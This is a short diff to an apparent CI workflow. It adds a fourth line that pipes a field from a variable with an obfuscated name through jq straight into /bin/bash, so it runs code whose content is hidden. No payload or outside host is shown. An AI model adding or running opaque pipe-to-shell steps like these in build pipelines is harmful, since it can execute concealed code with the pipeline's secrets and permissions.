@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$wwdd118" | jq -r .vcv8 | /bin/bash
           printf '%s' "$jtv7348" | jq -r .lvwe21 | /bin/bash
           echo $swq505 | jq -r .dmht8611 | /bin/bash
+          echo $dkjmz6 | jq -r .jg3 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
